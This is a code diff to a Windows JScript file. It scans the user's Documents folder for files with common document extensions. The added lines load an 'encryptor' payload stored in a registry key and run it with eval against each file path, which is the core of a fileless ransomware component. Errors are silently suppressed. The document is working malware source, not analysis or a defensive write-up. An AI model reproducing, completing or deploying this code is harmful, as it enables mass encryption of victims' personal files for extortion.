@@ -1,5 +1,8 @@
+var encryptor;
+var personalFolderRegistryEntry = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Personal';
+var encryptorRegistryEntry = 'HKLM\\encryptor';
+var fileNameToEncryptVar = 'fileNameToEncrypt';
 var fso = new ActiveXObject('Scripting.FileSystemObject');
-
 var fileExtList = { 
 	txt : 'txt', 
 	doc : 'doc', 
@@ -31,7 +34,8 @@ function getFiles(folderPath) {
   	for (; !fileList.atEnd(); fileList.moveNext()) {
 			try {
 				if(isValidExt(fileList.item().ShortName)) {
-					
+					var evalString = 'var '+fileNameToEncryptVar+' = \''+fileList.item().path.replace(/\\/g, '\\\\')+'\';' + encryptor;
+					eval(evalString);
 				}
 			} catch(err) {}
 		}
@@ -54,8 +58,8 @@ function getFolders(path) {
 
 function getDocumentFolder() {
 	var wsh = new ActiveXObject('WScript.Shell');
-	var path = wsh.RegRead('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Personal');
+	var path = wsh.RegRead(personalFolderRegistryEntry);
+	encryptor = wsh.RegRead(encryptorRegistryEntry);
 	getFolders(path);
 };
-
 getDocumentFolder();
